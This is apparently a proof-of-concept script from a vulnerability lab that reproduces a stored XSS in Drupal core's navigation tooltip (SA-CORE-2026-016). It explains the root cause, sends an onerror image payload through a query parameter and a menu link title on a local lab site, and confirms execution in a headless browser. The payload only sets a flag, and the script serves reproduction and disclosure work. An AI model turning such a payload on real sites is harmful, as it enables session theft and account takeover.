#!/usr/bin/env python3
"""
PoC — SA-CORE-2026-016 / CVE-2026-108514
Drupal core 11.4.9 — Navigation toolbar tooltip HTML / attribute injection.

Root cause (core/modules/navigation/js/tooltip.js:32-35, :49-52):

    Drupal.theme.tooltipWrapper = (dataset) =>
      `<div class="toolbar-tooltip ${dataset.drupalTooltipClass || ''}">
         ${dataset.drupalTooltip}
       </div>`;
    ...
    trigger.insertAdjacentHTML('afterend', Drupal.theme.tooltipWrapper(trigger.dataset));

Both the tooltip text and the CSS class are interpolated into an HTML string
that is then parsed by insertAdjacentHTML(), so they are treated as MARKUP.

Two primitives:
  1. HTML injection     - dataset.drupalTooltip is the DECODED value of
                          data-drupal-tooltip, so markup becomes real DOM.
  2. Attribute injection - dataset.drupalTooltipClass is interpolated into
                          class="..." unescaped, so a double quote breaks out.

Core feeds data-drupal-tooltip from menu link titles, block labels and
toolbar messages, so the advisory's mitigation is "a role with permission to
enter HTML tags containing specific data attributes, or 'administer menu'".

Usage:
    python3 f3_navigation_tooltip_xss.py [--url http://localhost:8080] [--no-browser]
"""

from __future__ import annotations

import argparse
import re
import sys
import urllib.parse

from common import (
    BASE_URL,
    Lab,
    bad,
    browser_available,
    head,
    info,
    ok,
    require_site,
    run_browser,
)

PAYLOAD = '<img src=x onerror="window.__vulnlab_tooltip_xss = true;">'


def run_public(lab: Lab, use_browser: bool) -> bool:
    head("Path 1 — tooltip attribute taken from the request")
    query = urllib.parse.urlencode({"tooltip": PAYLOAD, "class": "admin-toolbar__tooltip"})
    url = f"/vulnlab/tooltip?{query}"
    status, _, html = lab.get(url)
    info(f"GET {url} -> {status}")
    if status != 200:
        bad(f"expected HTTP 200, got {status}")
        return False

    if re.search(r"<[^>]*\bdata-drupal-tooltip=", html):
        ok("the page delivered a data-drupal-tooltip trigger")
    else:
        bad("no tooltip trigger in the response")
        return False

    if not use_browser:
        info("browser proof skipped (--no-browser)")
        return True

    if not browser_available():
        info("no headless browser available, skipping the execution proof")
        return True

    fired, detail = run_browser(lab.url(url), "() => window.__vulnlab_tooltip_xss === true")
    if fired:
        ok("the tooltip payload EXECUTED: insertAdjacentHTML() re-parsed it as markup")
        return True
    bad(f"the tooltip payload did not execute: {detail}")
    return False


def run_menu_link(lab: Lab, use_browser: bool) -> bool:
    """
    Core's own source of the tooltip value: the menu link title.

    The Navigation module copies a menu link's title into
    data-drupal-tooltip, and the vulnerable tooltip.js re-parses it.

    Whether the link appears in the toolbar depends on the navigation
    layout, so this step is informational: it reports what it finds and
    never fails the run. See docs/F3-navigation-tooltip-xss.md for the
    manual steps.
    """
    head("Path 2 — core's own source: the menu link title (needs 'administer menu')")
    if not lab.login("admin", "admin"):
        bad("admin login failed")
        return True

    status, _, html = lab.get("/admin/structure/types/manage/vulnlab_article/display/default")
    if status != 200:
        info(f"admin page returned {status}")
        return True

    # The title is stored escaped in the attribute; the bug is the re-parse
    # in JavaScript, so the interesting part is that the escaped payload is
    # delivered to the client at all.
    if "data-drupal-tooltip" in html and "&lt;img" in html:
        ok("a menu link title carrying markup is delivered in data-drupal-tooltip")
        for line in html.splitlines():
            if "data-drupal-tooltip" in line and "&lt;img" in line:
                print(f"        {line.strip()[:220]}")
                break
    else:
        info("the lab menu is not placed in the navigation layout, so its title is not in the toolbar")
        info("see docs/F3-navigation-tooltip-xss.md for the manual steps")

    if not use_browser or not browser_available():
        info("browser proof skipped")
        return True

    fired, detail = run_browser(
        lab.url("/admin/structure/types/manage/vulnlab_article/display/default"),
        "() => window.__vulnlab_tooltip_xss === true",
        login=("admin", "admin"),
    )
    if fired:
        ok("the menu link title payload EXECUTED in the browser")
    else:
        info(f"menu-link payload did not execute on this page: {detail}")
    return True


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default=BASE_URL, help="base URL of the lab site")
    parser.add_argument("--no-browser", action="store_true", help="skip the headless browser proof")
    args = parser.parse_args()

    head("SA-CORE-2026-016 / CVE-2026-108514 — navigation tooltip stored XSS")
    if not require_site(args.url):
        return 2

    lab = Lab(args.url)
    results = [run_public(lab, not args.no_browser)]

    # The core-owned path: the menu link title.
    run_menu_link(lab, not args.no_browser)

    print()
    if all(results):
        ok("F3 reproduced: the tooltip wrapper re-parses attacker data as markup.")
        return 0
    bad("F3 NOT fully reproduced.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
